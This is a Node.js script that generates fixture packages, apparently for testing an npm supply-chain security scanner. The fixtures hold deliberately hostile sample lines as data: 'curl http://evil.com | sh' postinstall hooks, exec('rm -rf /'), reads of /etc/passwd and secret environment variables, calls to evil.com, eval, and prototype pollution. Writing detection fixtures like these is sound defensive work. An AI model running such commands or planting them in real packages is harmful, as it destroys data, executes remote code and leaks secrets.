const { mkdirSync, writeFileSync } = require("fs");
const { join, dirname } = require("path");

const fixtures = [
  {
    path: "buffer-package/node_modules/buffer-test/index.js",
    content: 'const buf = Buffer.from("' + "a".repeat(150) + '");',
  },
  {
    path: "buffer-package/node_modules/buffer-test/package.json",
    content: JSON.stringify({ name: "buffer-test", version: "1.0.0" }),
  },
  {
    path: "dynamic-package/node_modules/dynamic-test/index.js",
    content: 'const fn = new Function("return 42");\nconst result = fn();',
  },
  {
    path: "dynamic-package/node_modules/dynamic-test/package.json",
    content: JSON.stringify({ name: "dynamic-test", version: "1.0.0" }),
  },
  {
    path: "env-package/node_modules/env-test/index.js",
    content:
      "const apiKey = process.env.API_KEY;\nconst token = process.env.SECRET_TOKEN;\nconst home = process.env.HOME;",
  },
  {
    path: "env-package/node_modules/env-test/package.json",
    content: JSON.stringify({ name: "env-test", version: "1.0.0" }),
  },
  {
    path: "eval-package/node_modules/eval-test/index.js",
    content:
      "eval(\"console.log('malicious')\");\nconst code = \"alert('xss')\";\neval(code);",
  },
  {
    path: "eval-package/node_modules/eval-test/package.json",
    content: JSON.stringify({ name: "eval-test", version: "1.0.0" }),
  },
  {
    path: "fs-package/node_modules/fs-test/index.js",
    content:
      "const fs = require('fs');\nfs.readFileSync('/etc/passwd');\nfs.writeFileSync('/tmp/evil', 'data');\nfs.unlinkSync('/important/file');",
  },
  {
    path: "fs-package/node_modules/fs-test/package.json",
    content: JSON.stringify({ name: "fs-test", version: "1.0.0" }),
  },
  {
    path: "metadata-package/node_modules/metadata-test/index.js",
    content:
      "const os = require('os');\nconst hostname = os.hostname();\nconst platform = os.platform();",
  },
  {
    path: "metadata-package/node_modules/metadata-test/package.json",
    content: JSON.stringify({ name: "metadata-test", version: "1.0.0" }),
  },
  {
    path: "network-package/node_modules/network-test/index.js",
    content:
      "const https = require('https');\nconst http = require('http');\n\nhttps.get('https://evil.com/data');\nhttp.request({host: 'malicious.net'});\n\nfetch('https://api.evil.com/steal');",
  },
  {
    path: "network-package/node_modules/network-test/package.json",
    content: JSON.stringify({ name: "network-test", version: "1.0.0" }),
  },
  {
    path: "pollution-package/node_modules/pollution-test/index.js",
    content:
      "const obj = {};\nobj.__proto__ = evil;\nobj.constructor.prototype = evil;",
  },
  {
    path: "pollution-package/node_modules/pollution-test/package.json",
    content: JSON.stringify({ name: "pollution-test", version: "1.0.0" }),
  },
  {
    path: "process-package/node_modules/process-test/index.js",
    content:
      "const { exec, spawn } = require('child_process');\nexec('rm -rf /');\nspawn('curl', ['http://evil.com']);",
  },
  {
    path: "process-package/node_modules/process-test/package.json",
    content: JSON.stringify({ name: "process-test", version: "1.0.0" }),
  },
  {
    path: "secrets-package/node_modules/secrets-test/index.js",
    content:
      'const awsKey = "AKIAIOSFODNN7EXAMPLE";\nconst token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";\nconst password = "super_secret_password_123";',
  },
  {
    path: "secrets-package/node_modules/secrets-test/package.json",
    content: JSON.stringify({ name: "secrets-test", version: "1.0.0" }),
  },
  {
    path: "native-package/node_modules/native-test/index.js",
    content: "console.log('native');",
  },
  {
    path: "native-package/node_modules/native-test/package.json",
    content: JSON.stringify({
      name: "native-test",
      version: "1.0.0",
      dependencies: { "node-gyp": "^9.0.0" },
    }),
  },
  {
    path: "scripts-package/node_modules/scripts-test/index.js",
    content: "console.log('test');",
  },
  {
    path: "scripts-package/node_modules/scripts-test/package.json",
    content: JSON.stringify({
      name: "scripts-test",
      version: "1.0.0",
      scripts: {
        postinstall: "curl http://evil.com | sh",
        preinstall: "rm -rf /tmp/*",
      },
    }),
  },
  {
    path: "multi-issue-package/node_modules/multi-issue-pkg/index.js",
    content:
      "const secret = \"AKIAIOSFODNN7EXAMPLE\";\neval(\"console.log('evil')\");\nconst apiKey = process.env.SECRET_KEY;\nconst https = require('https');\nhttps.get('https://evil.com/exfiltrate');\nconst { exec } = require('child_process');\nexec('curl http://malicious.com | bash');\nconst fs = require('fs');\nfs.writeFileSync('/tmp/backdoor', 'malicious');",
  },
  {
    path: "multi-issue-package/node_modules/multi-issue-pkg/package.json",
    content: JSON.stringify({ name: "multi-issue-pkg", version: "1.0.0" }),
  },
  // Obfuscation fixture: long string and number array
  {
    path: "obfuscation-package/node_modules/obfuscation-test/index.js",
    content:
      'const s = "' +
      "x".repeat(300) +
      '";\n' +
      "const arr = [" +
      Array.from({ length: 30 }, (_, i) => i).join(",") +
      "];",
  },
  {
    path: "obfuscation-package/node_modules/obfuscation-test/package.json",
    content: JSON.stringify({ name: "obfuscation-test", version: "1.0.0" }),
  },
  // Minified fixture: very long line and low whitespace ratio
  {
    path: "minified-package/node_modules/minified-test/index.js",
    content: "" + "a".repeat(1500),
  },
  {
    path: "minified-package/node_modules/minified-test/package.json",
    content: JSON.stringify({ name: "minified-test", version: "1.0.0" }),
  },
  // Typosquat fixture: package name similar to a popular package
  {
    path: "typosquat-package/node_modules/reactt/index.js",
    content: "console.log('reactt');",
  },
  {
    path: "typosquat-package/node_modules/reactt/package.json",
    content: JSON.stringify({ name: "reactt", version: "1.0.0" }),
  },
  // Simple package used by CLI options tests
  {
    path: "simple-package/node_modules/test-package/index.js",
    content:
      "const { exec } = require('child_process');\nexec('curl http://malicious.com | bash');",
  },
  {
    path: "simple-package/node_modules/test-package/package.json",
    content: JSON.stringify({ name: "test-package", version: "1.0.0" }),
  },
];

const baseDir = join(__dirname, "__fixtures__");

fixtures.forEach(({ path, content }) => {
  const fullPath = join(baseDir, path);
  const dir = dirname(fullPath);
  mkdirSync(dir, { recursive: true });
  writeFileSync(fullPath, content, "utf-8");
  console.log(`Created: ${path}`);
});

// Ensure each fixture has a root package.json with dependencies
// derived from the node_modules package names we just created.
const fixtureDeps = new Map();
for (const { path } of fixtures) {
  const parts = path.split("/");
  // Expect pattern: <fixture>/node_modules/<dep>/...
  if (parts.length >= 4 && parts[1] === "node_modules") {
    const fixture = parts[0];
    const depName = parts[2];
    const key = fixture;
    const deps = fixtureDeps.get(key) || new Set();
    deps.add(depName);
    fixtureDeps.set(key, deps);
  }
}

for (const [fixture, deps] of fixtureDeps.entries()) {
  const pkgPath = join(baseDir, fixture, "package.json");
  const dependencies = {};
  for (const dep of deps) dependencies[dep] = "1.0.0";
  const pkgJson = {
    name: fixture,
    version: "1.0.0",
    dependencies,
  };
  mkdirSync(dirname(pkgPath), { recursive: true });
  writeFileSync(pkgPath, JSON.stringify(pkgJson), "utf-8");
  console.log(`Ensured root package.json for: ${fixture}`);
}

console.log("All fixtures created successfully!");
